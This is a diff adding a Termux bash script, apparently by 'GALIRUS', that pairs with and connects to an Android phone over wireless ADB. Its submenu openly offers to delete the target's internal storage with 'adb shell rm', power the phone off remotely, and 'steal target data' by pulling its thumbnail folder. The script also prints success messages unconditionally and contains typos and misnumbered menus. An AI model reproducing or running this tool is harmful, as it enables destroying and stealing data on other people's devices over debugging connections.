@@ -1,0 +1,166 @@
+#!/data/data/com.termux/files/usr/bin/bash
+q="-e"
+e="echo "
+v="1.0.0"
+m="\033[1;31m"
+h="\033[1;32m"
+k="\033[1;33m"
+b="\033[1;34m"
+bl="\033[1;36m"
+p="\033[1;37m"
+gal="adb"
+while true; do
+adb="adb"
+if [ -f "$adb" ]; then
+echo $q $h "Installing CLEAR next to Program !"
+clear
+play -q $HOME/JARVIS/sound/welcome.mp3 &>/dev/null &
+$e $q $b
+function show_loading() {
+local x=0
+local delay=0.1
+local spin_chars="-\|/"
+local spin_length=${#spin_chars}
+while true; do
+local char=${spin_chars:x++%spin_length:1}
+printf '\r%s' "GALIRUS PROJECTS $char"
+sleep $delay
+done
+}
+show_loading &
+sleep 6
+kill $!
+play -q $HOME/JARVIS/sound/robot.mp3 &>/dev/null
+play -q $HOME/JARVIS/sound/robot2.mp3 &>/dev/null &
+while [ "$else" = "$ulang" ]
+do
+clear
+$e $q $b"======================================================"
+$e $q $m
+$e $q " █████╗ ██████╗ ██████╗ "
+$e $q "██╔══██╗██╔══██╗██╔══██╗"
+$e $q "███████║██║  ██║██████╦╝$p"
+$e $q "██╔══██║██║  ██║██╔══██╗"
+$e $q "██║  ██║██████╔╝██████╦╝"
+$e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h GALIRUS"
+$e $q $b"======================================================"
+$e $q $b "[$k 1$b ]$p ADB PAIR"
+$e $q $b "[$k 2$b ]$p ADB CONNECT"
+$e $q $b "[$k 2$b ]$p ADB MENU"
+$e $q $b "[$k 0$b ]$p EXIT$b"
+read -p "Choose (0-2) : " pil
+if [ "$pil" = "1" ]
+then
+$e $q  "$p Please login$b"
+read -p " Ip Address : " ip
+read -p " Port : " port
+read -p " Code : " code
+$e $q $bl "======================="
+$gal pair $ip:$port $code &>/dev/null &
+echo -e $h "Success login"
+touch $HOME/JARVIS/IP/$ip
+sleep 3
+elif [ "$pil" = "2" ]; then
+$e $q $p"Next Connect ADB$h"
+sleep 2
+cd $HOME/JARVIS/IP
+ls
+echo $q $b
+read -p "IP       : " ip
+read -p "Port (2) : " port2
+$e $q $bl "======================="
+$gal connect $ip:$port2 &>/dev/null &
+$e $q $h "Success Connect"
+$e $q $bl "======================="
+sleep 3
+elif [ "$pil" = "3" ]; then
+clear
+$e $q $b"======================================================"
+$e $q $m
+$e $q " █████╗ ██████╗ ██████╗ "
+$e $q "██╔══██╗██╔══██╗██╔══██╗"
+$e $q "███████║██║  ██║██████╦╝$p"
+$e $q "██╔══██║██║  ██║██╔══██╗"
+$e $q "██║  ██║██████╔╝██████╦╝"
+$e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h GALIRUS"
+$e $q $b"======================================================"
+$e $q $b "[$k 1$b ]$p SINGNAL 9 ( NETHUNTER )"
+$e $q $b "[$k 2$b ]$p INSTALL BATTERY SAVE"
+$e $q $b "[$k 3$b ]$p HAPUS DIREKTORI INTERNAL"
+$e $q $b "[$k 4$b ]$p MEMATIKAN PONSEL"
+$e $q $b "[$k 5$b ]$p CURI DATA TARGET DEBUGGING"
+$e $q $b "[$k 0$b ]$p exit$b"
+read -p "Choose (0-2) : "  pi
+if [ $pi = "1" ]; then
+$e $q $k "you choose 1"
+sleep 2
+$e $q $k "starting code"
+sleep 3
+adb shell "/system/bin/device_config set_sync_disabled_for_tests persistent"
+adb shell "/system/bin/device_config put activity_manager max_phantom_processes 2147483647"
+adb shell settings put global settings_enable_monitor_phantom_procs false
+adb shell "/system/bin/dumpsys activity settings | grep max_phantom_processes"
+adb shell "/system/bin/device_config get activity_manager max_phantom_processes"
+sleep 2
+clear
+$e $q $h "Prosses Success"
+sleep 2
+elif [ "$pi" = "2" ]; then
+$e $q $k "you choose 2$bl"
+sleep 2
+adb push battery.sh /sdcard
+adb shell chmod +x /sdcard/battery.sh
+adb shell sh /sdcard/battery.sh
+sleep 3
+celar
+$e $q $h "Success Battery Save"
+sleep 3
+elif [ "$pi" = "3" ]; then
+echo $q $h " Sabar ! loading!$k"
+adb shell rm /storage/emulated/0/
+read -p " Success | ENTER UNTUK KELUAR"
+elif [ "$pi" = "4" ]; then
+echo $q $h "Mematikan Ponsel$k"
+sleep 3
+adb shell reboot -p
+read -p " Success | ENTER UNTUK KELUAR"
+elif [ "$pi" = "5" ]; then
+echo $q $h "Mengambil Data Dari Internal$k"
+sleep 3
+
+$gal pull /storage/emulated/0/Movies/.thumbnails/  /storage/emulated/0/
+echo $h "Succes ! Silahkan Cek Sdcard Awal Anda"
+read -p " ENTER UNTUK KELUAR"
+elif [ $pi = "0" ]; then
+$e $q $k "You Choose Exit"
+sleep 3
+else
+$e $q $m "Input Failed"
+sleep 2
+fi
+elif [ "$pil" = "0" ]; then
+$e $q $k "You Choose Exit"
+sleep 1
+$e $q $h "Subscribe my Channel "
+termux-open "https://www.youtube.com/@GalirusProjects"
+sleep 2
+exit
+else
+$e $q $m "Input Falied"
+sleep 2
+fi
+done
+
+
+else
+clear
+echo $q $m "Installing Package....!"
+sleep 3
+apt update && apt upgrade
+apt install sox -y
+apt install android-tools -y
+clear
+echo $q $h "Installing Succes ! "
+touch $adb
+fi
+done
